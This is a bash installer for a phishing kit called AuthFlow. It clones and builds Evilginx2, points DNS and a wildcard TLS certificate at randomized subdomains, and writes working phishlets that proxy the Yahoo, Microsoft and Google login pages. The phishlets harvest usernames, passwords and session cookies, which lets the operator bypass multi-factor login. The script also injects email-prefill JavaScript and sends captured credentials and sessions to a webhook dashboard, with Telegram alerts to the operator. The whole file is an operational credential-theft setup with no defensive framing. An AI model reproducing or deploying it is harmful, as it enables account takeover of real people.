#!/bin/bash
set -euo pipefail

# ============================================================================
# AuthFlow Production Installer - Non-Interactive, Deterministic
# ============================================================================
# Usage:
#   sudo DOMAIN=example.com VPS_IP=1.2.3.4 \
#        TELEGRAM_TOKEN=xxx TELEGRAM_CHAT=xxx \
#        CLOUDFLARE_TOKEN=xxx ADMIN_PASS=xxx \
#        ./scripts/install-prod.sh
#
# Or with flags:
#   sudo ./scripts/install-prod.sh \
#     --domain example.com --vps-ip 1.2.3.4 \
#     --telegram-token xxx --telegram-chat xxx \
#     --cloudflare-token xxx --admin-pass xxx
# ============================================================================

# Color codes
readonly GREEN='\033[0;32m'
readonly RED='\033[0;31m'
readonly YELLOW='\033[0;33m'
readonly NC='\033[0m'

# Installation paths
readonly INSTALL_DIR="/opt/authflow"
readonly EVILGINX_DIR="/opt/evilginx"
readonly REPO_SOURCE="${REPO_SOURCE:-.}"
readonly SERVICE_NAME="authflow"
readonly SERVICE_USER="authflow"
readonly SERVICE_GROUP="authflow"
readonly APP_PORT="${APP_PORT:-8080}"
readonly APP_BINARY="authflow-server"

# Config files
readonly CF_CREDS_FILE="/etc/letsencrypt/cloudflare-token.ini"
readonly CONFIG_FILE="$INSTALL_DIR/config/config.json"
readonly SYSTEMD_UNIT="/etc/systemd/system/${SERVICE_NAME}.service"
readonly NGINX_SITE="/etc/nginx/sites-available/authflow"
readonly NGINX_ENABLED="/etc/nginx/sites-enabled"

# ============================================================================
# Logging functions
# ============================================================================
log() {
    echo -e "${GREEN}[+]${NC} $1"
}

err() {
    echo -e "${RED}[ERROR]${NC} $1" >&2
    exit 1
}

warn() {
    echo -e "${YELLOW}[!]${NC} $1"
}

# ============================================================================
# Argument parsing
# ============================================================================
parse_args() {
    while [[ $# -gt 0 ]]; do
        case $1 in
            --domain)
                DOMAIN="$2"
                shift 2
                ;;
            --vps-ip)
                VPS_IP="$2"
                shift 2
                ;;
            --telegram-token)
                TELEGRAM_TOKEN="$2"
                shift 2
                ;;
            --telegram-chat)
                TELEGRAM_CHAT="$2"
                shift 2
                ;;
            --cloudflare-token)
                CLOUDFLARE_TOKEN="$2"
                shift 2
                ;;
            --admin-pass)
                ADMIN_PASS="$2"
                shift 2
                ;;
            --repo-source)
                REPO_SOURCE="$2"
                shift 2
                ;;
            --proxy-url)
                PROXY_URL="$2"
                shift 2
                ;;
            --go-proxy)
                GO_PROXY="$2"
                shift 2
                ;;
            *)
                err "Unknown argument: $1"
                ;;
        esac
    done
}

# ============================================================================
# Configuration validation
# ============================================================================
validate_config() {
    local missing=0

    [[ -z "${DOMAIN:-}" ]] && { warn "DOMAIN not set"; missing=1; }
    [[ -z "${VPS_IP:-}" ]] && { warn "VPS_IP not set"; missing=1; }
    [[ -z "${TELEGRAM_TOKEN:-}" ]] && { warn "TELEGRAM_TOKEN not set"; missing=1; }
    [[ -z "${TELEGRAM_CHAT:-}" ]] && { warn "TELEGRAM_CHAT not set"; missing=1; }
    [[ -z "${CLOUDFLARE_TOKEN:-}" ]] && { warn "CLOUDFLARE_TOKEN not set"; missing=1; }

    if [[ $missing -eq 1 ]]; then
        err "Required environment variables or flags not provided"
    fi

    # Generate secure random values if not provided
    if [[ -z "${ADMIN_PASS:-}" ]]; then
        ADMIN_PASS=$(openssl rand -base64 16 | tr -d '/+=' | cut -c1-16)
        log "Generated admin password: $ADMIN_PASS"
    fi

    if [[ -z "${WEBHOOK_SECRET:-}" ]]; then
        WEBHOOK_SECRET=$(openssl rand -hex 16)
    fi

    if [[ -z "${ADMIN_PATH:-}" ]]; then
        ADMIN_PATH=$(openssl rand -hex 12)
        log "Generated admin path: /$ADMIN_PATH"
    fi

    PROXY_URL="${PROXY_URL:-}"
    GO_PROXY="${GO_PROXY:-https://proxy.golang.org,direct}"

    # Generate endpoint names for phishlets
    EP1="collector-$(openssl rand -hex 4)"
    EP2="tracker-$(openssl rand -hex 4)"
    EP3="monitor-$(openssl rand -hex 4)"
}

# ============================================================================
# Update Cloudflare DNS records
# ============================================================================
update_dns() {
    log "Updating Cloudflare DNS records..."
    local zone_id
    zone_id=$(curl -s -X GET "https://api.cloudflare.com/client/v4/zones?name=$DOMAIN" \
        -H "Authorization: Bearer $CLOUDFLARE_TOKEN" \
        -H "Content-Type: application/json" | jq -r '.result[0].id')

    if [[ "$zone_id" == "null" || -z "$zone_id" ]]; then
        err "Could not find Zone ID for $DOMAIN in Cloudflare. Check your token permissions."
    fi

    local records=("$DOMAIN" "$EP1.$DOMAIN" "$EP2.$DOMAIN" "$EP3.$DOMAIN")
    for record in "${records[@]}"; do
        log "Setting A record for $record -> $VPS_IP"
        local existing_id
        existing_id=$(curl -s -X GET "https://api.cloudflare.com/client/v4/zones/$zone_id/dns_records?name=$record&type=A" \
            -H "Authorization: Bearer $CLOUDFLARE_TOKEN" \
            -H "Content-Type: application/json" | jq -r '.result[0].id')

        local payload="{\"type\":\"A\",\"name\":\"$record\",\"content\":\"$VPS_IP\",\"ttl\":120,\"proxied\":false}"
        
        if [[ "$existing_id" != "null" && -n "$existing_id" ]]; then
            curl -s -X PUT "https://api.cloudflare.com/client/v4/zones/$zone_id/dns_records/$existing_id" \
                -H "Authorization: Bearer $CLOUDFLARE_TOKEN" \
                -H "Content-Type: application/json" \
                -d "$payload" > /dev/null
        else
            curl -s -X POST "https://api.cloudflare.com/client/v4/zones/$zone_id/dns_records" \
                -H "Authorization: Bearer $CLOUDFLARE_TOKEN" \
                -H "Content-Type: application/json" \
                -d "$payload" > /dev/null
        fi
    done
}

# ============================================================================
# Pre-flight checks
# ============================================================================
preflight_checks() {
    [[ $EUID -ne 0 ]] && err "This script must be run as root (sudo)"

    [[ ! -f "$REPO_SOURCE/cmd/authflow/main.go" ]] && err "Repository source not found at $REPO_SOURCE/cmd/authflow/main.go"
    [[ ! -f "$REPO_SOURCE/go.mod" ]] && warn "go.mod not found in source. It will be initialized during the build phase."

    # Verify required commands exist
    # We exclude nginx and certbot here because they are installed by the script itself later
    for cmd in git curl wget openssl systemctl; do
        command -v "$cmd" &>/dev/null || err "Required command not found: $cmd"
    done

    log "Pre-flight checks passed"
}

# ============================================================================
# Install dependencies with pinned versions
# ============================================================================
install_dependencies() {
    log "Installing system dependencies..."
    apt-get update -y

    # Install required packages. Removing strict version pinning to ensure 
    # compatibility with the latest available security patches in the repository.
    apt-get install -y \
        git \
        curl \
        wget \
        build-essential \
        make \
        unzip \
        jq \
        sqlite3 \
        nginx \
        certbot \
        python3-certbot-dns-cloudflare \
        golang-go

    log "Dependencies installed successfully"
}

# ============================================================================
# Setup Cloudflare credentials file
# ============================================================================
setup_cloudflare_creds() {
    log "Setting up Cloudflare credentials..."

    # Create credentials file
    install -m 600 /dev/null "$CF_CREDS_FILE"

    cat > "$CF_CREDS_FILE" << EOF
# Cloudflare API Token
dns_cloudflare_api_token = ${CLOUDFLARE_TOKEN}
EOF

    log "Cloudflare credentials stored at $CF_CREDS_FILE"
}

# ============================================================================
# Install Evilginx2
# ============================================================================
install_evilginx() {
    log "Installing Evilginx2..."

    # Clone or update Evilginx2
    rm -rf "$EVILGINX_DIR"
    git clone https://github.com/kgretzky/evilginx2.git "$EVILGINX_DIR"

    # Build
    cd "$EVILGINX_DIR"
    make build

    # Install binary
    install -m 755 build/evilginx /usr/local/bin/evilginx
    log "Evilginx2 installed at /usr/local/bin/evilginx"

    # Create phishlets and certs directories
    mkdir -p "$EVILGINX_DIR"/{phishlets,certs,lures}

    cd - > /dev/null
}

# ============================================================================
# Deploy AuthFlow application
# ============================================================================
deploy_authflow() {
    log "Deploying AuthFlow..."

    # Create installation directory
    mkdir -p "$INSTALL_DIR"/{data,logs,config}

    # Copy repository to installation directory
    log "Copying source code from $REPO_SOURCE..."
    rsync -av --exclude=.git --exclude=vendor --exclude=build \
          "$REPO_SOURCE/" "$INSTALL_DIR/"

    # Ensure proper ownership
    chown -R "$SERVICE_USER:$SERVICE_GROUP" "$INSTALL_DIR" 2>/dev/null || true

    log "AuthFlow source deployed to $INSTALL_DIR"
}

# ============================================================================
# Build AuthFlow binary
# ============================================================================
build_authflow() {
    log "Building AuthFlow binary..."

    cd "$INSTALL_DIR"

    log "Using Go Proxy: $GO_PROXY"
    export GOPROXY="$GO_PROXY"

    # Initialize Go module if missing to ensure internal imports resolve
    if [[ ! -f "go.mod" ]]; then
        log "Initializing Go module 'authflow'..."
        go mod init authflow || err "Failed to initialize Go module"
    fi

    # Ensure Go dependencies are resolved
    go mod tidy
    go mod download

    # Build with optimizations
    go build \
        -ldflags="-s -w -X main.Version=$(git describe --tags --always 2>/dev/null || echo 'dev')" \
        -o "$APP_BINARY" \
        ./cmd/authflow

    # Verify binary
    [[ -f "$APP_BINARY" ]] || err "Build failed: binary not created"

    chmod 755 "$APP_BINARY"
    log "AuthFlow binary built successfully"

    cd - > /dev/null
}

# ============================================================================
# Create configuration file
# ============================================================================
create_config() {
    log "Creating configuration file..."

    cat > "$CONFIG_FILE" << EOF
{
    "domain": "$DOMAIN",
    "vps_ip": "$VPS_IP",
    "telegram_token": "$TELEGRAM_TOKEN",
    "telegram_chat": "$TELEGRAM_CHAT",
    "admin_pass": "$ADMIN_PASS",
    "data_dir": "$INSTALL_DIR/data",
    "admin_path": "$ADMIN_PATH",
    "admin_whitelist": [],
    "endpoints": {
        "sub_portal1": "$EP1.$DOMAIN",
        "sub_portal2": "$EP2.$DOMAIN",
        "sub_portal3": "$EP3.$DOMAIN"
    },
    "retention_days": 30,
    "webhook_secret": "$WEBHOOK_SECRET",
    "proxy_url": "$PROXY_URL"
}
EOF

    # Secure permissions
    chmod 600 "$CONFIG_FILE"
    chown "$SERVICE_USER:$SERVICE_GROUP" "$CONFIG_FILE" 2>/dev/null || true

    log "Configuration created at $CONFIG_FILE"
    log "Portal endpoints:"
    log "  - https://$EP1.$DOMAIN"
    log "  - https://$EP2.$DOMAIN"
    log "  - https://$EP3.$DOMAIN"
}

# ============================================================================
# Provision TLS certificates
# ============================================================================
provision_tls() {
    log "Provisioning TLS certificates with Cloudflare DNS..."

    # We use a wildcard to cover the main domain and all generated sub-portals
    # This simplifies the request and ensures all portal endpoints are covered.
    local domain_args="-d $DOMAIN -d *.$DOMAIN"

    # Run certbot with Cloudflare DNS
    certbot certonly \
        --dns-cloudflare \
        --dns-cloudflare-credentials "$CF_CREDS_FILE" \
        --non-interactive \
        --agree-tos \
        --email "admin@$DOMAIN" \
        --no-eff-email \
        $domain_args

    log "TLS certificates provisioned successfully"
}

# ============================================================================
# Configure nginx reverse proxy
# ============================================================================
configure_nginx() {
    log "Configuring nginx reverse proxy..."

    # Disable default site
    rm -f "$NGINX_ENABLED/default"

    # Get certificate path
    local cert_dir="/etc/letsencrypt/live/$DOMAIN"

    # Create nginx site configuration
    cat > "$NGINX_SITE" << EOF
server {
    listen 80;
    listen [::]:80;
    server_name $DOMAIN *.$DOMAIN;
    location / {
        return 301 https://\$host\$request_uri;
    }
}

# Dashboard - AuthFlow
server {
    listen 443 ssl;
    http2 on;
    server_name $DOMAIN;

    ssl_certificate $cert_dir/fullchain.pem;
    ssl_certificate_key $cert_dir/privkey.pem;

    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;

    location / {
        proxy_pass http://127.0.0.1:$APP_PORT;
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \$scheme;

        # WebSocket support
        proxy_http_version 1.1;
        proxy_set_header Upgrade \$http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_read_timeout 86400;
    }
}

# Phishing Portals - Evilginx
server {
    listen 443 ssl;
    http2 on;
    server_name $EP1.$DOMAIN $EP2.$DOMAIN $EP3.$DOMAIN;

    ssl_certificate $cert_dir/fullchain.pem;
    ssl_certificate_key $cert_dir/privkey.pem;

    location / {
        proxy_pass https://127.0.0.1:8443;
        proxy_ssl_verify off;
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_redirect off;
        proxy_buffering off;
        proxy_http_version 1.1;
        proxy_set_header Upgrade \$http_upgrade;
        proxy_set_header Connection "upgrade";
    }
}
EOF

    # Enable site
    ln -sf "$NGINX_SITE" "$NGINX_ENABLED/"

    # Test configuration
    nginx -t || err "nginx configuration test failed"

    # Reload nginx
    systemctl reload nginx

    log "nginx configured and reloaded"
}

# ============================================================================
# Create system user and directories
# ============================================================================
setup_system_user() {
    log "Setting up system user and directories..."

    # Create user if not exists
    if ! id "$SERVICE_USER" &>/dev/null; then
        useradd -r -s /bin/false -d /var/lib/authflow "$SERVICE_USER" || true
    fi

    # Create required directories
    mkdir -p "$INSTALL_DIR"/{data,logs,config}
    chown -R "$SERVICE_USER:$SERVICE_GROUP" "$INSTALL_DIR"
    chmod 750 "$INSTALL_DIR"
    chmod 750 "$INSTALL_DIR"/{data,logs,config}

    log "System user and directories configured"
}

# ============================================================================
# Create systemd service unit
# ============================================================================
create_systemd_service() {
    log "Creating systemd service unit..."

    cat > "$SYSTEMD_UNIT" << EOF
[Unit]
Description=AuthFlow Web Authentication Server
Documentation=https://github.com/tartmo/authflow
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=$SERVICE_USER
Group=$SERVICE_GROUP
WorkingDirectory=$INSTALL_DIR

ExecStart=$INSTALL_DIR/$APP_BINARY -config=$CONFIG_FILE -port=$APP_PORT

# Security settings
NoNewPrivileges=true
PrivateTmp=true
ProtectSystem=strict
ProtectHome=true
ReadWritePaths=$INSTALL_DIR/data $INSTALL_DIR/logs

# Restart policy
Restart=always
RestartSec=5
StartLimitInterval=600
StartLimitBurst=3

# Resource limits
LimitNOFILE=65535
LimitNPROC=4096

[Install]
WantedBy=multi-user.target
EOF

    # Reload systemd
    systemctl daemon-reload

    # Enable service
    systemctl enable "$SERVICE_NAME"

    log "Systemd service created and enabled"
}

# ============================================================================
# Start AuthFlow service
# ============================================================================
start_service() {
    log "Starting AuthFlow service..."

    systemctl restart "$SERVICE_NAME"

    # Wait for service to start
    sleep 2

    # Check if service is running
    if systemctl is-active --quiet "$SERVICE_NAME"; then
        log "AuthFlow service started successfully"
    else
        warn "AuthFlow service may not be running. Check logs:"
        warn "  journalctl -u $SERVICE_NAME -n 50"
    fi
}

# ============================================================================
# Configure Evilginx2 integration
# ============================================================================
configure_evilginx_integration() {
    log "Configuring Evilginx2 integration..."

    # Copy certificates to Evilginx directory for internal use
    cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" "$EVILGINX_DIR/certs/"
    cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" "$EVILGINX_DIR/certs/"

    # Create Evilginx config
    cat > "$EVILGINX_DIR/config.yaml" << EOF
daemon: false
debug: false
version: 3.0.0
domain: $DOMAIN
ipv4: 0.0.0.0
http_port: 8081
https_port: 8443
redirect_url: https://www.google.com
phishlets_path: $EVILGINX_DIR/phishlets
cert_path: $EVILGINX_DIR/certs
database: $EVILGINX_DIR/evilginx.db
EOF

    # Create Yahoo phishlet
    cat > "$EVILGINX_DIR/phishlets/yahoo.yaml" << EOF
name: 'yahoo'
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: '$EP1', orig_sub: 'login', domain: 'yahoo.com', session: true, is_landing: true}
sub_filters:
  - {trg: 'login.yahoo.com', orig: 'login.yahoo.com', repl: '$EP1.{hostname}'}
auth_tokens:
  - domain: '.yahoo.com'
    keys: ['A3', 'A1', 'A1S']
credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'
login:
  domain: 'login.yahoo.com'
  path: '/'
js_inject:
  - trigger: 'login.yahoo.com'
    code: |
      (function() {
        var urlParams = new URLSearchParams(window.location.search);
        var email = urlParams.get('email');
        if (email) {
          var emailField = document.querySelector('input[name="username"]');
          if (emailField) {
            emailField.value = email;
            emailField.dispatchEvent(new Event('input', { bubbles: true }));
          }
        }
      })()
webhook:
  url: "http://127.0.0.1:$APP_PORT/api/webhook"
  headers:
    X-Webhook-Secret: "$WEBHOOK_SECRET"
  format: "json"
  events: ["credentials", "session"]
EOF

    # Create Microsoft phishlet
    cat > "$EVILGINX_DIR/phishlets/microsoft.yaml" << EOF
name: 'microsoft'
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: '$EP2', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
sub_filters:
  - {trg: 'login.microsoftonline.com', orig: 'login.microsoftonline.com', repl: '$EP2.{hostname}'}
auth_tokens:
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'
login:
  domain: 'login.microsoftonline.com'
  path: '/'
js_inject:
  - trigger: 'login.microsoftonline.com'
    code: |
      (function() {
        var urlParams = new URLSearchParams(window.location.search);
        var email = urlParams.get('email');
        if (email) {
          var emailField = document.querySelector('input[name="login"]');
          if (emailField) {
            emailField.value = email;
            emailField.dispatchEvent(new Event('input', { bubbles: true }));
          }
        }
      })()
webhook:
  url: "http://127.0.0.1:$APP_PORT/api/webhook"
  headers:
    X-Webhook-Secret: "$WEBHOOK_SECRET"
  format: "json"
  events: ["credentials", "session"]
EOF

    # Create Google phishlet
    cat > "$EVILGINX_DIR/phishlets/google.yaml" << EOF
name: 'google'
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: '$EP3', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true}
sub_filters:
  - {trg: 'accounts.google.com', orig: 'accounts.google.com', repl: '$EP3.{hostname}'}
auth_tokens:
  - domain: '.google.com'
    keys: ['SID', 'LSID', '__Secure-1PSID', '__Secure-3PSID']
credentials:
  username:
    key: 'identifier'
    search: '(.*)'
    type: 'post'
  password:
    key: 'Passwd'
    search: '(.*)'
    type: 'post'
login:
  domain: 'accounts.google.com'
  path: '/v3/signin/identifier'
js_inject:
  - trigger: 'accounts.google.com'
    code: |
      (function() {
        var urlParams = new URLSearchParams(window.location.search);
        var email = urlParams.get('email');
        if (email) {
          var emailField = document.querySelector('input[type="email"]');
          if (emailField) {
            emailField.value = email;
            emailField.dispatchEvent(new Event('input', { bubbles: true }));
          }
        }
      })()
webhook:
  url: "http://127.0.0.1:$APP_PORT/api/webhook"
  headers:
    X-Webhook-Secret: "$WEBHOOK_SECRET"
  format: "json"
  events: ["credentials", "session"]
EOF

    # Create Evilginx systemd service
    cat > /etc/systemd/system/evilginx.service << EOF
[Unit]
Description=Evilginx2 Phishing Proxy
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=$EVILGINX_DIR
ExecStart=/usr/local/bin/evilginx -c $EVILGINX_DIR/config.yaml -p $EVILGINX_DIR/phishlets
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

    # Configure phishlets
    sleep 2
    /usr/local/bin/evilginx -c "$EVILGINX_DIR/config.yaml" -p "$EVILGINX_DIR/phishlets" << CMDS
phishlets hostname yahoo $EP1.$DOMAIN
phishlets hostname microsoft $EP2.$DOMAIN
phishlets hostname google $EP3.$DOMAIN
phishlets enable yahoo
phishlets enable microsoft
phishlets enable google
exit
CMDS

    systemctl daemon-reload
    systemctl enable evilginx
    systemctl start evilginx

    log "Evilginx2 integration configured"
}

# ============================================================================
# Print installation summary
# ============================================================================
print_summary() {
    local cert_dir="/etc/letsencrypt/live/$DOMAIN"

    echo ""
    echo "=========================================="
    echo "   AuthFlow Installation Complete"
    echo "=========================================="
    echo ""
    echo "Configuration:"
    echo "  Domain: $DOMAIN"
    echo "  VPS IP: $VPS_IP"
    echo "  Admin Path: /$ADMIN_PATH"
    echo "  Admin Password: $ADMIN_PASS"
    echo "  Webhook Secret: $WEBHOOK_SECRET"
    echo ""
    echo "Installation Paths:"
    echo "  Application: $INSTALL_DIR"
    echo "  Evilginx2: $EVILGINX_DIR"
    echo "  Config: $CONFIG_FILE"
    echo ""
    echo "Service Management:"
    echo "  Status: systemctl status $SERVICE_NAME"
    echo "  Start: systemctl start $SERVICE_NAME"
    echo "  Stop: systemctl stop $SERVICE_NAME"
    echo "  Restart: systemctl restart $SERVICE_NAME"
    echo "  Logs: journalctl -u $SERVICE_NAME -f"
    echo ""
    echo "Nginx:"
    echo "  Configuration: $NGINX_SITE"
    echo "  Test: nginx -t"
    echo "  Reload: systemctl reload nginx"
    echo "  Logs: tail -f /var/log/nginx/authflow_*.log"
    echo ""
    echo "TLS Certificates:"
    echo "  Path: $cert_dir"
    echo "  Auto-renew: certbot renew (via systemd timer)"
    echo ""
    echo "Quick Access:"
echo "  Dashboard: https://$DOMAIN/$ADMIN_PATH/"
    echo ""
    echo "=========================================="
}

# ============================================================================
# Main installation flow
# ============================================================================
main() {
    clear
    echo "=========================================="
    echo "   AuthFlow Production Installer"
    echo "=========================================="
    echo ""

    # Parse arguments
    parse_args "$@"

    # Validate configuration
    validate_config

    # Run installation steps
    preflight_checks
    setup_system_user
    install_dependencies
    setup_cloudflare_creds
    install_evilginx
    deploy_authflow
    build_authflow
    create_config
    provision_tls
    configure_nginx
    configure_evilginx_integration
    create_systemd_service
    start_service

    # Print summary
    print_summary

    # Verify Telegram notification logic
    if [[ -n "${TELEGRAM_TOKEN:-}" && -n "${TELEGRAM_CHAT:-}" ]]; then
        local proxy_args=""
        if [[ -n "${PROXY_URL:-}" ]]; then
            proxy_args="--proxy $PROXY_URL"
        fi

        curl $proxy_args -s -X POST "https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage" \
            -d "chat_id=${TELEGRAM_CHAT}" \
            -d "text=✅ AuthFlow successfully deployed on $DOMAIN. Admin: /$ADMIN_PATH" > /dev/null || true
    fi

    log "Installation completed successfully!"
}

# Execute main function
main "$@"
